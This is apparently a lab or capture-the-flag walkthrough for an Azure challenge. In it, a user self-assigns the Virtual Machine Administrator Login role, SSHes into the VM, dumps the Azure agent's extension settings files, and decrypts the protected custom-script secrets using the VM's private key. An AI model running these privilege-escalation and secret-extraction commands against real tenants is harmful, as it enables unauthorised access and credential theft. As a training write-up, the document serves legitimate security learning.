
Login as Pokey with TAP to Azure Portal

![loginAzure Portal]

<img width="291" height="55" alt="image" src="https://github.com/user-attachments/assets/547d0df1-6620-47b4-8342-789902cd3de0" />

Check for VM

![VM status]

<img width="902" height="584" alt="image" src="https://github.com/user-attachments/assets/f8f524d8-7b34-404e-b764-b519dcfd95ac" />

- Noticed that, VM has no public IP to access so we need to come up to Goo to adjust the network due to Goo's privilege.

Check on Pokey portal, we can see:

![AFTERNETWORKALLCHANGEFROMGOO]

<img width="577" height="372" alt="image" src="https://github.com/user-attachments/assets/4507d48c-c5a3-45c8-ba6b-0e8fa7ee856b" />

Because Pokey has  Virtual Machine Data Access Administrator (preview) so it can self-assign Virtual Machine Admin Login so Pokey can login to VM with its account.

`az role assignment create \
  --assignee-object-id "$POKEY_ID" --assignee-principal-type User \
  --role "Virtual Machine Administrator Login" \
  --scope "/subscriptions/5b9a2611-6b85-49e7-89ee-a48a0bd4c1dd/resourceGroups/rg-11201416/providers/Microsoft.Compute/virtualMachines/VM1"`
  
![SUCCESSASSIGNROLE]
<img width="1667" height="387" alt="image" src="https://github.com/user-attachments/assets/ada43129-6635-4b8e-8e43-6f8c79f65d9d" />

Time to explore, you should have this screen when you connect via Azure CLI

![AZURECLI]
<img width="667" height="611" alt="image" src="https://github.com/user-attachments/assets/63203ddb-fbb0-4348-956a-488b940a13af" />

After login via ssh, run those command to get the custom script which is set with Protectedsettings and encrypted on the Blob storage.

`sudo find /var/lib/waagent -name '*.settings' -exec cat {} \;`

![Result]

<img width="1908" height="74" alt="image" src="https://github.com/user-attachments/assets/07d95c34-0703-4279-b713-2742b01dbfa2" />

#To encrypted, we need to find the private key under this folder /var/lib/waagent/ and the file end with .prv. Or you can get it from the previous prompt as well. Using the prompt below to decrypt it:
`THUMB="13705B66F7E069A6B035BC2C7E88F42EA3E01AA1"
BLOB="MIICEQYJKoZIhvcNAQcDoIICAjCCAf4CAQAxggFpMIIBZQIBADBNMDkxNzA1BgoJkiaJk/IsZAEZFidXaW5kb3dzIEF6dXJlIENSUCBDZXJ0aWZpY2F0ZSBHZW5lcmF0b3ICEFRUGx6kNta2R6SpENUA/qIwDQYJKoZIhvcNAQEBBQAEggEAZcIBljhrg4Pv1AVgyupCxuNiaHEsc5Dekd0B2iPTsRkpCdyvk6KbJUgRPBVfZKh/k9z6LUQRmuKvxIHqBuQ3t2C5PyDWVxmQFy7ujG3dxL2YLMw91g8mXA2BNbBEHps3rNr+UR7aixGxy1EM4r8uZq+qsygqUrNnQndqSxMekWPaZjuKBkp+At8cklJcfYdRFPVjLbpCOHRdV6ioQA5ts4e3ZUW31DNgFwK2/KdSLP0TDP6TBKcQ9Rn+SucHIX1LgxCTe1pjgBebQExu9KX8IIGff7IZDHUF5ggwBSm3mEQ2yZcTrnHZqK8k6whVyb+cg7EBql42alQqzyAolsLgkTCBiwYJKoZIhvcNAQcBMBQGCCqGSIb3DQMHBAin8+jRzhN4QoBoX3s1QMAD9v8oxfDCL3WgKYrzpgMswnqAwLEJMjYZ8nswywlhMdsdJ6Qc6bC/gX4YM498qzQVpv/INYCEWf79vUzTLL9p/pTXkXQbLk8A8m2uKyBJndhQmT1aOk7sVakjohJVVzqwM04="
echo "$BLOB" | base64 -d | sudo openssl cms -decrypt -inform DER -inkey "/var/lib/waagent/$THUMB.prv"`

![Congrats]

<img width="1915" height="94" alt="image" src="https://github.com/user-attachments/assets/aeed4e86-4a39-48e0-8167-c8695ffcfd6c" />

WE GOT IT



 

